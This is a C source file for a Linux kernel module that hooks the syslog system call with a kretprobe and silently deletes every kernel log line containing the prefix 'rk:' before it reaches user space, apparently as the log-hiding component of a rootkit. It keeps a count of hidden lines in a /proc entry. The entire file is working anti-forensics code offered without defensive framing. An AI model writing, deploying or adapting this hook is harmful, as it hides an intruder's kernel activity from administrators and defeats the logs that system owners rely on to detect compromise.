// SPDX-License-Identifier: GPL-2.0
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/slab.h>
#include <linux/uaccess.h>

#define HIDE_PREFIX "rk:"

static struct proc_dir_entry *proc_entry;
static atomic_t hidden_count = ATOMIC_INIT(0);

struct syslog_ctx {
	int type;
	char __user *ubuf;
};

static int entry_syslog(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct syslog_ctx *ctx = (void *)ri->data;
	struct pt_regs *uregs = (struct pt_regs *)regs->di;

	ctx->type = (int)uregs->di;
	ctx->ubuf = (char __user *)uregs->si;
	return 0;
}

static int ret_syslog(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct syslog_ctx *ctx = (void *)ri->data;
	int ret = (int)regs_return_value(regs);
	char *kbuf, *src, *dst, *end, *nl;

	if (ret <= 0 || (ctx->type != 2 && ctx->type != 3))
		return 0;

	kbuf = kmalloc(ret + 1, GFP_KERNEL);
	if (!kbuf)
		return 0;

	if (copy_from_user(kbuf, ctx->ubuf, ret)) {
		kfree(kbuf);
		return 0;
	}
	kbuf[ret] = '\0';

	src = kbuf;
	dst = kbuf;
	end = kbuf + ret;

	while (src < end) {
		nl = memchr(src, '\n', end - src);
		if (!nl)
			nl = end - 1;

		if (strnstr(src, HIDE_PREFIX, nl - src + 1)) {
			atomic_inc(&hidden_count);
			src = nl + 1;
			continue;
		}

		if (dst != src)
			memmove(dst, src, nl - src + 1);
		dst += nl - src + 1;
		src = nl + 1;
	}

	ret = dst - kbuf;
	copy_to_user(ctx->ubuf, kbuf, ret);
	regs_set_return_value(regs, ret);
	kfree(kbuf);
	return 0;
}

static struct kretprobe krp = {
	.kp.symbol_name	= "__x64_sys_syslog",
	.entry_handler	= entry_syslog,
	.handler	= ret_syslog,
	.data_size	= sizeof(struct syslog_ctx),
	.maxactive	= 20,
};

static int stats_show(struct seq_file *m, void *v)
{
	seq_printf(m, "hidden=%d\n", atomic_read(&hidden_count));
	return 0;
}

static int __init loghider_init(void)
{
	int err;

	err = register_kretprobe(&krp);
	if (err)
		return err;

	pr_info("rk: log hiding active\n");
	pr_info("rk: this line should be hidden from dmesg\n");

	proc_entry = proc_create_single("rk_logfilter", 0444, NULL,
					stats_show);
	if (!proc_entry) {
		unregister_kretprobe(&krp);
		return -ENOMEM;
	}

	return 0;
}

static void __exit loghider_exit(void)
{
	proc_remove(proc_entry);
	unregister_kretprobe(&krp);
}

module_init(loghider_init);
module_exit(loghider_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Kernel log hiding via syslog hook");
